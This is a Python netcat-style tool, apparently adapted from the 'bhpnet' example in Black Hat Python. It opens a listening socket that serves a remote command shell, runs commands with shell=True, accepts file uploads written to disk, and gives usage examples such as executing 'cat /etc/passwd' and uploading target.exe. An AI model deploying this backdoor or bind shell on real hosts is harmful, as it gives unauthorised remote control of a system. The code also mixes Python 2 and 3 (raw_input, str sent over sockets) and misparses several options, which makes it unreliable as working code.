import sys
import socket
import getopt
import threading
import subprocess

listen = False
command  = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

#Command Line Handling

def usage():
	print("Net Tool")
	print("")
	print("Usage: net_tool.py -t target_host -p port")
	print("-l --listen				- listen on [host]:[port] for ╗")
	print("							  incoming connection")
	print("-e --execute=file_to_run	- execute the given file upon ╗")
	print("							  receiving a connection")
	print("-c --command 			- initialize a command shell")
	print("-u --upload=destination  - upon receiving connection upload a ╗")
	print("							  and write to [destination]")
	print("")
	print("")
	print("Examples: ")
	print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
	print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
	print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
	print("echo 'AAABBBCCC' | ./net_tool.py -t 192.168.11.12 -p 135")
	sys.exit(0)

def client_handler(client_socket):
	
	global upload
	global execute
	global command

	#Check for upload
	if len(upload_destination):
		
		#Read in all of the bytes and write to destination
		file_buffer = ""

		#Keep data stream until none else available
		while True:
			data =  client_socket.recv(1024)

			if not data:
				break
			else:
				file_buffer += data

		#Take bytes and write them out
		try:
			file_descriptor = open(upload_destination, "wb")
			file_descriptor.write(file_buffer)
			file_descriptor.close()

			#ACK succesful write file
			client_socket.send(f"Succesfully uploaded file to {upload_destination} \r\n")

		except:
			client_socket.send(f"Failed to save file to {upload_destination}")

	#Check for command excution
	if len(execute):
		#Run Command
		output = run_command(execute)
		client_socket.send(output)

	#Go into loop if another command shell was requested
	if command:

		while True:
			#Show simple prompt
			client_socket.send("<BHP:#> ")
			#Listen until linefeed (Enter)
			cmd_buffer = ""
			
			while "\n" not in cmd_buffer:
				cmd_buffer += client_socket.recv(1024)

			#Send back command output
			response = run_command(cmd_buffer)

			#Send back response
			client_socket.send(response)


def client_sender(buffer):
	
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		#Connect to target host
		client.connect((target, port))
		if len(buffer):
			client.send(buffer)
		while True:
			# Wait for data
			recv_len = 1
			response = ""

			while recv_len:
				data = client.recv(4096)
				recv_len = len(data)
				response += data

				if recv_len < 4096:
					break

			print(response)

			#wait for more input

			buffer = raw_input("")
			buffer += "\n"

			#Send it off

			client.send(buffer)

	except:

		print("[*] Exception! Exiting.")

		#Tear down the connection

		client.close()

def server_loop():
	global target

	#If no target is defined, we listen on all interfaces
	if not len(target):
		target = "0.0.0.0"

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((target, port))

	server.listen(5)

	while True:
		
		client_socket, addr = server.accept()

		#Spin off a thread to handle our new client

		client_thread = threading.Thread(target=client_handler, args=(client_socket,))
		client_thread.start()

def run_command(command):
	
	#Trim newline
	command = command.rstrip()

	#Run command and get output back
	try:
		output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)

	except:
		output = "Failed to execute command.\r\n"

	#Send output back to client
	return output



def main():
	global listen
	global port
	global execute
	global command
	global upload_destination
	global target

	if not len(sys.argv[1:]):
		usage()

	#Read commandline options
	try:
		opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu", ["help", "listen", "execute", "target", "port", "command", "upload"])
	except getopt.GetoptError as err:
		print(str(err))
		usage()

	for o, a in opts:
		if o in ("-h", "--help"):
			usage()
		elif o in ("-l", "--listen"):
			listen = True
		elif o in ("-e", "--execute"):
			execute = a
		elif o in ("-c", "--commandshell"):
			command = True
		elif o in ("-u", "--upload"):
			upload_destination = a
		elif o in ("-t", "--target"):
			target = a
		elif o in ("-p", "--port"):
			port = int(a)
		else:
			assert(False, "Unhandled Option")

	#Listen or just send data from stdin
	if not listen and len(target) and port > 0:
		#read in the buffer from the command line
		#this will block, so send ctrl+d if not sending input
		#to stdin
		buffer = sys.stdin.read()

		#send data off
		client_sender(buffer)

	#We are going to listen and potentially upload things, execute commands, and drop a shell back depending on our command options
	if listen:
		server_loop()

main()



